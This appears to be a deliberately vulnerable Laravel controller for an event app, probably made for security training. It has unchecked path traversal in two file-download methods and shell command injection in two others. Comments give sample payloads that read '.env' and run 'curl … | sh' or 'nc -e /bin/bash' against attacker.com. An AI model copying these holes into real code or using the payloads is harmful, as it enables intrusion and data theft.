<?php
namespace App\Http\Controllers;

use Illuminate\Http\Request;

class OrganizerController extends Controller
{
    // VULNERABILITY: Path Traversal — unduh materi event
    public function unduhMateri(Request $request)
    {
        $materi = $request->input('materi'); // "slides_workshop_1.pdf"
        // Penyerang: materi=../../config/database.php atau ../../.env
        $path   = storage_path('materi/' . $materi);
        if (!file_exists($path)) abort(404, 'File tidak ditemukan');
        return response()->download($path);
    }

    // VULNERABILITY: Path Traversal — baca banner event
    public function banner(Request $request)
    {
        $file = $request->input('file');
        // Tidak ada validasi — penyerang bisa baca file sembarang
        return response(readfile(public_path('banners/' . $file)))->header('Content-Type', 'image/png');
    }

    // VULNERABILITY: Command Injection — kirim notifikasi peserta
    public function kirimNotifikasi(Request $request)
    {
        $eventId  = $request->input('event_id');
        $channel  = $request->input('channel'); // "email; curl http://attacker.com/exfil.sh | sh"
        $template = $request->input('template');
        shell_exec("php artisan notify:send --event=$eventId --channel=$channel --template=$template");
        return response()->json(['status' => 'Notifikasi dikirim']);
    }

    // VULNERABILITY: Command Injection — export daftar peserta
    public function exportPeserta(Request $request)
    {
        $eventId = $request->input('event_id');
        $format  = $request->input('format', 'csv'); // "csv; nc -e /bin/bash attacker.com 4444"
        $result  = exec("python3 /opt/event-tools/export.py --event=$eventId --format=$format", $output);
        return response()->json(['file' => $result, 'log' => $output]);
    }
}
